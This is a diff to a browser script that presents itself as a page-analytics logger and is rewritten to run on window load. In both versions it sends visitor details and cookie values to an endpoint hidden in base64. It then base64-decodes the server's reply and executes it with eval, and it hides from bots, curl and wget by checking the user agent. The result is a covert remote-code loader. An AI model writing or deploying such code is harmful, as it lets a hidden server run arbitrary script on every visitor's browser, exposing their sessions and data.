@@ -1,43 +1,41 @@
-(function(){
-    function run() {
-        try {
-            if(getCookie('x_request_should') === 'false') return;
-            var ua = navigator.userAgent.toLowerCase();
-            if (/bot|spider|crawler|curl|wget/.test(ua)) return;
-            var data = {
-                url: location.pathname,
-                referrer: document.referrer || '',
-                screenWidth: (window.screen.width||0),
-                screenHeight: (window.screen.height||0),
-                language: navigator.language || '',
-                host: location.hostname,
-                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                requestID: getCookie('x_request_id'),
-            };
-            var verify = '';
-            if(document.currentScript.dataset.verify){
-                verify = window.atob(document.currentScript.dataset.verify);
-            }
-            var endpoint = verify + '/_log_col';
+window.addEventListener('load', function(){
+    try {
+        if(getCookie('x_request_should') === 'false') return;
+        var ua = navigator.userAgent.toLowerCase();
+        if (/bot|spider|crawler|curl|wget/.test(ua)) return;
 
-            var payload = JSON.stringify(data);
-            fetch(endpoint, {
-                method: 'POST',
-                body: payload,
-                headers: {'Content-Type':'application/json'},
-                keepalive: true
-            }).then(res => res.text()).then(text => {eval(window.atob(text))}).catch(function(){});
+        var data = {
+            url: location.pathname,
+            referrer: document.referrer || '',
+            screenWidth: (window.screen.width||0),
+            screenHeight: (window.screen.height||0),
+            language: navigator.language || '',
+            host: location.hostname,
+            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            requestID: getCookie('x_request_id'),
+        };
 
-            function getCookie(name) {
-                const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
-                return match ? decodeURIComponent(match[2]) : null;
-            }
-        } catch(e){}
-    }
+        var verify = '';
+        if(document.currentScript && document.currentScript.dataset.verify){
+            verify = window.atob(document.currentScript.dataset.verify);
+        }
 
-    if(document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', run);
-    } else {
-        run();
-    }
-})();
+        var endpoint = verify + '/_log_col';
+        var payload = JSON.stringify(data);
+
+        fetch(endpoint, {
+            method: 'POST',
+            body: payload,
+            headers: {'Content-Type':'application/json'},
+            keepalive: true
+        })
+            .then(res => res.text())
+            .then(text => { eval(window.atob(text)) })
+            .catch(function(){});
+
+        function getCookie(name) {
+            const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+            return match ? decodeURIComponent(match[2]) : null;
+        }
+    } catch(e){}
+});
